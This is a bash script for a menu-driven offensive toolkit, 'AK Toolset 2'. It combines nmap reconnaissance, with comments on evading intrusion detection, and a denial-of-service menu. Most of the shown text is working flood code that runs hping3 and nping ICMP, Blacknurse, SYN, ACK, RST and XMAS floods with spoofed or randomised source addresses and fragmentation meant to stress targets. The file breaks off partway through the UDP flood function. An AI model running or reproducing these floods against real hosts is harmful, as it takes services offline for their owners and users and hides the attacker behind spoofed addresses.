#!/bin/bash
PS3="Choose an options : "

# Display welcome message
welcome_message() {
    echo "==========================================================="
    echo "       Welcome to AK Toolset 2 ! Choose an option below       "
    echo "            Telegram : https://t.me/AKHacking1             "
    echo "            Github : https://github.com/ak404z             "
    echo "==========================================================="
    echo ""
}

# Show welcome message at startup
welcome_message

# Trap Ctrl+C to clear screen, show welcome message, and keep the script running
trap 'clear; welcome_message; [ "$current_menu" ] && $current_menu' SIGINT

##MAINMENU##
##################
##START MAINMENU##
mainmenu()
{
    current_menu="mainmenu"  # تحديث المتغير ليعكس القائمة الحالية
    #build a main menu using bash select
    #from here, the various sub menus can be selected and from them, modules can be run
    mainmenu=("Recon" "DOS" "Extraction" "View Readme" "Quit")
    select opt in "${mainmenu[@]}"; do
        if [ "$opt" = "Quit" ]; then
            echo "Quitting...Thank you for using AK Toolset 2 !" && sleep 1 && clear
            exit 0
        elif [ "$opt" = "Recon" ]; then
            reconmenu
        elif [ "$opt" = "DOS" ]; then
            dosmenu
        elif [ "$opt" = "Extraction" ]; then
            extractionmenu
        elif [ "$opt" = "View Readme" ]; then
            showreadme
        else
            echo "That's not a valid option! Hit Return to show main menu"
        fi
    done
}
##END MAINMENU##
################
##/MAINMENU##


##RECON##
###################
##START RECONMENU##
reconmenu()
{
#build a menu for the recon modules using bash select
		reconmenu=("Show IP" "DNS Recon" "Ping Sweep" "Quick Scan" "Detailed Scan" "UDP Scan" "Check Server Uptime" "IPsec Scan" "Go back")
	select reconopt in "${reconmenu[@]}"; do
#show external IP & interface IP(s)
	if [ "$reconopt" = "Show IP" ]; then
		showip
#DNS Recon
    elif [ "$reconopt" = "DNS Recon" ]; then
        dnsrecon
#Ping Sweep
    elif [ "$reconopt" = "Ping Sweep" ]; then
        pingsweep
#Recon Network
    elif [ "$reconopt" = "Quick Scan" ]; then
        quickscan
#Stealth Scan
    elif [ "$reconopt" = "Detailed Scan" ]; then
        detailedscan
#UDP Scan
	elif [ "$reconopt" = "UDP Scan" ]; then
		udpscan
#Check uptime of server
    elif [ "$reconopt" = "Check Server Uptime" ]; then
        checkuptime
#IPsec Scan
	elif [ "$reconopt" = "IPsec Scan" ]; then
		ipsecscan
#Go back
	elif [ "$reconopt" = "Go back" ]; then
		mainmenu
## Default if no menu option selected is to return an error
	else
  		echo  "That's not a valid option! Hit Return to show menu"
	fi
	done
}
##END RECONMENU##
#################

################
##START SHOWIP##
showip()
{		echo "External IP lookup uses curl..."
		echo "External IP is detected as:"
#use curl to lookup external IP
		curl https://icanhazip.com/s/
		echo ""
		echo ""
#show interface IP's
		echo "Interface IP's are:"
		ip a|grep inet
#if ip a command fails revert to ifconfig
	if ! [[ $? = 0 ]]; then
		ifconfig|grep inet
	fi
		echo ""
}
##END SHOWIP##
##############

##################
##START DNSRECON##
dnsrecon()
{ echo "This module performs passive recon via forward/reverse name lookups for the target (as appropriate) and performs a whois lookup"
	echo "Enter target:"
#need a target IP/hostname to check
	read -i $TARGET -e TARGET
host $TARGET
#if host command doesnt work try nslookup instead
if ! [[ $? = 0 ]]; then
nslookup $TARGET
fi
#run a whois lookup on the target
sleep 1 && whois -H $TARGET
if ! [[ $? = 0 ]]; then
#if whois fails, do a curl lookup to ipinfo.io
sleep 1 && curl ipinfo.io/$TARGET
fi
}
##END DNSRECON##
################

###################
##START PINGSWEEP##
pingsweep()
{ echo "This module performs a simple ICMP echo 'ping' sweep"
	echo "Please enter the target (e.g. 192.168.1.0/24):"
#need to know the subnet to scan for live hosts using pings
	read -i $TARGET -e TARGET
#launch ping sweep using nmap
#this could be done with ping command, but that is extremely difficult to code in bash for unusual subnets so we use nmap instead
sudo nmap -sP -PE $TARGET --reason
}
##END PINGSWEEP##
#################

######################
##START QUICKSCAN##
quickscan()
{ echo "This module conducts a scan using nmap"
echo "It is designed to scan an entire network for common open ports"
echo "It will perform a TCP SYN port scan of the 1000 most common ports"
echo "Depending on the target, the scan might take a long time to finish"
echo "Please enter the target host/IP/subnet:"
#we need to know where to scan.  Whilst a hostname is possible, this module is designed to scan a subnet range
read -i $TARGET -e TARGET
echo "Enter the speed of scan (0 means very slow and 5 means fast).
Slower scans are more subtle, but faster means less waiting around.
Default is 3:"
#How fast should we scan the target?
#Faster speed is more likely to be detected by IDS, but is less waiting around
read -i $SPEED -e SPEED
: ${SPEED:=3}
#launch the scan
sudo nmap -Pn -sS -T $SPEED $TARGET --reason
}
## END QUICKSCAN##
#####################

#####################
##START DETAILEDSCAN##
detailedscan()
{ echo "This module performs a scan using nmap"
echo "It is designed to perform a detailed scan of a specific host but can be used against an entire network"
echo "This scans ALL ports on the target. It also attempts OS detection and gathers service information"
echo "This scan might take a very long time to finish, please be patient"
echo "Enter the hostname/IP/subnet to scan:"
#need a target hostname/IP
read -i $TARGET -e TARGET
echo "Enter the speed of scan (0 means very slow and 5 means fast).
Slower scans are more subtle, but faster means less waiting around.
Default is 3:"
#How fast should we scan the target?
#Faster speed is more likely to be detected by IDS, but is less waiting around
read -i $SPEED -e SPEED
: ${SPEED:=3}
#scan using nmap.  Note the change in user-agent from the default nmap value to help avoid detection
sudo nmap -script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43" -Pn -p 1-65535 -sV -sC -A -O -T $SPEED $TARGET --reason
}
##END DETAILEDSCAN##
###################

#################
##START UDPSCAN##
udpscan()
{ echo "This module lets you scan a host/network for open UDP ports"
echo "It scans ALL ports on the target system. This may take some time, please be patient"
echo "Enter the host/subnet to scan:"
#need a target IP/hostname
read -i $TARGET -e TARGET
#How fast should we scan the target?
#Faster speed is more likely to be detected by IDS, but is less waiting around
echo "Enter the speed of scan (0 means very slow and 5 means fast).
Slower scans are more subtle, but faster means less waiting around.
Default is 3:"
read -i $SPEED -e SPEED
: ${SPEED:=3}
#launch the scan using nmap
sudo nmap -Pn -p 1-65535 -sU -T $SPEED $TARGET --reason
}
##END UDPSCAN##
###############

#####################
##START CHECKUPTIME##
checkuptime()
{ echo "This module will attempt to estimate the uptime of a given server, using hping3"
  echo "This is not guaranteed to work"
  echo "Enter your target:"
#need a target IP/hostname
  read -i $TARGET -e TARGET
#need a target port
  echo "Enter port (default is 80):"
  read -i $PORT -e PORT
  : ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#how many times to retry the check?
  echo "Retries? (3 is ideal and default, 2 might also work)"
  read -i $RETRY -e RETRY
  : ${RETRY:=3}
  echo "Starting.."
#use hping3 and enable the TCP timestamp option, and try to guess the timestamp update frequency and the remote system uptime.
#this might not work, but sometimes it does work very well
  sudo hping3 --tcp-timestamp -S $TARGET -p $PORT -c $RETRY | grep uptime
  echo "Done."
}
##END CHECKUPTIME##
###################

####################
##START IPSEC SCAN##
ipsecscan()
{ echo "Please enter the target hostname or IP:"
#we need to know where to scan
read -i $TARGET -e TARGET
# Encryption algorithms: DES, Triple-DES, AES/128, AES/192 and AES/256
ENCLIST="1 5 7/128 7/192 7/256"
# Hash algorithms: MD5, SHA1, SHA-256, SHA-384 and SHA-512
HASHLIST="1 2 4 5 6"
# Authentication methods: Pre-Shared Key, RSA Signatures, Hybrid Mode and XAUTH
AUTHLIST="1 3 64221 65001"
# Diffie-Hellman groups: 1, 2, 5 and 12
GROUPLIST="1 2 5 12"
for ENC in $ENCLIST; do
   for HASH in $HASHLIST; do
      for AUTH in $AUTHLIST; do
         for GROUP in $GROUPLIST; do
          sudo echo "--trans=$ENC,$HASH,$AUTH,$GROUP" | sudo xargs --max-lines=8 ike-scan --retry=1 -R -M $TARGET | grep -v "Starting" | grep -v "0 returned handshake; 0 returned notify"
         done
      done
   done
done
}
##END IPSECSCAN##
#################
##/RECON##
#############


##DOS##
#################
##START DOSMENU##
dosmenu()
{
#display a menu for the DOS module using bash select
		dosmenu=("ICMP Echo Flood" "ICMP Blacknurse" "TCP SYN Flood" "TCP ACK Flood" "TCP RST Flood" "TCP XMAS Flood" "UDP Flood" "SSL DOS" "Slowloris" "IPsec DOS" "Distraction Scan" "DNS NXDOMAIN Flood" "Go back")
	select dosopt in "${dosmenu[@]}"; do
#ICMP Echo Flood
	if [ "$dosopt" = "ICMP Echo Flood" ]; then
		icmpflood
#ICMP Blacknurse
	elif [ "$dosopt" = "ICMP Blacknurse" ]; then
		blacknurse
#TCP SYN Flood DOS
 	elif [ "$dosopt" = "TCP SYN Flood" ]; then
		synflood
#TCP ACK Flood
	elif [ "$dosopt" = "TCP ACK Flood" ]; then
		ackflood
#TCP RST Flood
	elif [ "$dosopt" = "TCP RST Flood" ]; then
		rstflood
#TCP XMAS Flood
	elif [ "$dosopt" = "TCP XMAS Flood" ]; then
		xmasflood
#UDP Flood
 	elif [ "$dosopt" = "UDP Flood" ]; then
		udpflood
#SSL DOS
	elif [ "$dosopt" = "SSL DOS" ]; then
		ssldos
#Slowloris
	elif [ "$dosopt" = "Slowloris" ]; then
		slowloris
#IPsec DOS
	elif [ "$dosopt" = "IPsec DOS" ]; then
		ipsecdos
#Distraction scan
	elif [ "$dosopt" = "Distraction Scan" ]; then
		distractionscan
#DNS NXDOMAIN Flood
	elif [ "$dosopt" = "DNS NXDOMAIN Flood" ]; then
		nxdomainflood
#Go back
	elif [ "$dosopt" = "Go back" ]; then
		mainmenu
	else
#Default if no valid menu option selected is to return an error
  	echo  "That's not a valid option! Hit Return to show menu"
	fi
done
}
##END DOSMENU##
###############

###################
##START ICMPFLOOD##
icmpflood()
{
		echo "Preparing to launch ICMP Echo Flood using hping3"
		echo "Enter target IP/hostname:"
#need a target IP/hostname
		read -i $TARGET -e TARGET
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting ICMP echo Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 --flood --spoof $SOURCE $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 --flood --rand-source $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 --flood $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 --flood $TARGET
	fi
}
##END ICMPFLOOD##
#################	

####################
##START BLACKNURSE##
blacknurse()
{		
		echo "Preparing to launch ICMP Blacknurse Flood using hping3"
		echo "Enter target IP/hostname:"
#need a target IP/hostname
		read -i $TARGET -e TARGET
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 3 --flood --spoof $SOURCE $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 3 --flood --rand-source $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 3 --flood $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 3 --flood $TARGET
	fi
}
##END BLACKNURSE##
##################


#####################
##START TCPSYNFLOOD##
synflood()
{		echo "TCP SYN Flood uses hping3...checking for hping3..."
	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
#hping3 is found, so use that for TCP SYN Flood
		echo "Enter target:"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a port to send TCP SYN packets to
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#should any data be sent with the SYN packet?  Default is to send no data
	echo "Send data with SYN packet? [y]es or [n]o (default)"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=n}
	if [[ $SENDDATA = y ]]; then
#we've chosen to send data, so how much should we send?
	echo "Enter number of data bytes to send (default 3000):"
	read -i $DATA -e DATA
	: ${DATA:=3000}
#If not an integer is entered, use default
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
	fi
#if $SENDDATA is not equal to y (yes) then send no data
	else DATA=0
	fi
#start TCP SYN flood using values defined earlier
#note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
#fragmentation should therefore place more stress on the target system
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -S $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu" 
		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -S $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -d $DATA --flood --frag -p $PORT -S $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag -p $PORT -S $TARGET
	fi
#No hping3 so using nping for TCP SYN Flood
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "Trying TCP SYN Flood with nping..this will work but is not ideal"
#need a valid target ip/hostname
		echo "Enter target:"
	read -i $TARGET -e TARGET
#need a valid target port
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
		: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#define source IP or use outgoing interface IP
		echo "Enter Source IP or use [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
#How many packets to send per second?  default is 10k
		echo "Enter number of packets to send per second (default is 10,000):"
	read RATE
		: ${RATE:=10000}
#how many packets in total to send?
#default is 100k, so using default values will send 10k packets per second for 10 seconds
		echo "Enter total number of packets to send (default is 100,000):"
	read TOTAL
		: ${TOTAL:=100000}
		echo "Starting TCP SYN Flood..."
#begin TCP SYN flood using values defined earlier
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
	fi
}
##END TCPSYNFLOOD##
###################

#####################
##START TCPACKFLOOD##
ackflood()
{		echo "TCP ACK Flood uses hping3...checking for hping3..."
	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
#hping3 is found, so use that for TCP ACK Flood
		echo "Enter target:"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a port to send TCP ACK packets to
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#should any data be sent with the ACK packet?  Default is to send no data
	echo "Send data with ACK packet? [y]es or [n]o (default)"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=n}
	if [[ $SENDDATA = y ]]; then
#we've chosen to send data, so how much should we send?
	echo "Enter number of data bytes to send (default 3000):"
	read -i $DATA -e DATA
	: ${DATA:=3000}
#If not an integer is entered, use default
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
	fi
#if $SENDDATA is not equal to y (yes) then send no data
	else DATA=0
	fi
#start TCP ACK flood using values defined earlier
#note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
#fragmentation should therefore place more stress on the target system
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -A $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -A $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -d $DATA --flood --frag -p $PORT -A $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag -p $PORT -A $TARGET
	fi
#No hping3 so using nping for TCP ACK Flood
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "Trying TCP ACK Flood with nping..this will work but is not ideal"
#need a valid target ip/hostname
		echo "Enter target:"
	read -i $TARGET -e TARGET
#need a valid target port
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#define source IP or use outgoing interface IP
		echo "Enter Source IP or use [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
#How many packets to send per second?  default is 10k
		echo "Enter number of packets to send per second (default is 10,000):"
	read RATE
		: ${RATE:=10000}
#how many packets in total to send?
#default is 100k, so using default values will send 10k packets per second for 10 seconds
		echo "Enter total number of packets to send (default is 100,000):"
	read TOTAL
		: ${TOTAL:=100000}
		echo "Starting TCP ACK Flood..."
#begin TCP ACK flood using values defined earlier
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --tcp --dest-port $PORT --flags ack --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --tcp --dest-port $PORT --flags ack --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
	fi
}
##END TCPACKFLOOD##
###################

#####################
##START TCPRSTFLOOD##
rstflood()
{		echo "TCP RST Flood uses hping3...checking for hping3..."
	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
#hping3 is found, so use that for TCP RST Flood
		echo "Enter target:"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a port to send TCP RST packets to
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#should any data be sent with the RST packet?  Default is to send no data
	echo "Send data with RST packet? [y]es or [n]o (default)"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=n}
	if [[ $SENDDATA = y ]]; then
#we've chosen to send data, so how much should we send?
	echo "Enter number of data bytes to send (default 3000):"
	read -i $DATA -e DATA
	: ${DATA:=3000}
#If not an integer is entered, use default
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
	fi
#if $SENDDATA is not equal to y (yes) then send no data
	else DATA=0
	fi
#start TCP RST flood using values defined earlier
#note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
#fragmentation should therefore place more stress on the target system
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -R $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -R $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -d $DATA --flood --frag -p $PORT -R $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag -p $PORT -R $TARGET
	fi
#No hping3 so using nping for TCP RST Flood
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "Trying TCP RST Flood with nping..this will work but is not ideal"
#need a valid target ip/hostname
		echo "Enter target:"
	read -i $TARGET -e TARGET
#need a valid target port
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#define source IP or use outgoing interface IP
		echo "Enter Source IP or use [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
#How many packets to send per second?  default is 10k
		echo "Enter number of packets to send per second (default is 10,000):"
	read RATE
		: ${RATE:=10000}
#how many packets in total to send?
#default is 100k, so using default values will send 10k packets per second for 10 seconds
		echo "Enter total number of packets to send (default is 100,000):"
	read TOTAL
		: ${TOTAL:=100000}
		echo "Starting TCP RST Flood..."
#begin TCP RST flood using values defined earlier
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --tcp --dest-port $PORT --flags rst --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --tcp --dest-port $PORT --flags rst --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
	fi
}
##END TCPRSTFLOOD##
###################

#####################
##START TCPXMASFLOOD##
xmasflood()
{		echo "TCP XMAS Flood uses hping3...checking for hping3..."
	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
#hping3 is found, so use that for TCP XMAS Flood
		echo "Enter target:"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a port to send TCP XMAS packets to
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#should any data be sent with the XMAS packet?  Default is to send no data
	echo "Send data with XMAS packet? [y]es or [n]o (default)"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=n}
	if [[ $SENDDATA = y ]]; then
#we've chosen to send data, so how much should we send?
	echo "Enter number of data bytes to send (default 3000):"
	read -i $DATA -e DATA
	: ${DATA:=3000}
#If not an integer is entered, use default
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
	fi
#if $SENDDATA is not equal to y (yes) then send no data
	else DATA=0
	fi
#start TCP XMAS flood using values defined earlier
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting TCP XMAS Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --spoof $SOURCE -p $PORT -F -S -R -P -A -U -X -Y $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting TCP XMAS Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --rand-source -p $PORT -F -S -R -P -A -U -X -Y $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting TCP XMAS Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -d $DATA --flood -p $PORT -F -S -R -P -A -U -X -Y $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting TCP XMAS Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA -p $PORT -F -S -R -P -A -U -X -Y $TARGET
	fi
#No hping3 so using nping for TCP RST Flood
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "Trying TCP XMAS Flood with nping..this will work but is not ideal"
#need a valid target ip/hostname
		echo "Enter target:"
	read -i $TARGET -e TARGET
#need a valid target port
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#define source IP or use outgoing interface IP
		echo "Enter Source IP or use [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
#How many packets to send per second?  default is 10k
		echo "Enter number of packets to send per second (default is 10,000):"
	read RATE
		: ${RATE:=10000}
#how many packets in total to send?
#default is 100k, so using default values will send 10k packets per second for 10 seconds
		echo "Enter total number of packets to send (default is 100,000):"
	read TOTAL
		: ${TOTAL:=100000}
		echo "Starting TCP XMAS Flood..."
#begin TCP RST flood using values defined earlier
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --tcp --dest-port $PORT --flags cwr,ecn,urg,ack,psh,rst,syn,fin --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --tcp --dest-port $PORT --flags cwr,ecn,urg,ack,psh,rst,syn,fin --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
	fi
}
##END TCPXMASFLOOD##
###################

##################
##START UDPFLOOD##
udpflood()
{ echo "UDP Flood uses hping3...checking for hping3..."
#check for hping on the local system
if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
#hping3 is found, so use that for UDP Flood
#need a valid target IP/hostname
	echo "Enter target:"
		read -i $TARGET -e TARGET
#need a valid target UDP port
	echo "Enter target port (defaults to 80):"
		read -i $PORT -e PORT
		: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
